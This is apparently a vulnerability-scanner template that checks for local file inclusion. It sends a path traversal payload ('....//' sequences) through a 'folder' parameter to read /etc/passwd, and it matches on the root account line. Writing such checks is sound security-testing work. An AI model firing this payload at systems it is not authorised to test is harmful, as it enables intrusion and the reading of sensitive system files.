id: lfi6-0088
name: 'Traversal in folder'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via folder'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      folder:
        - '....//....//....//....//....//....//....//....//....//....//....//etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
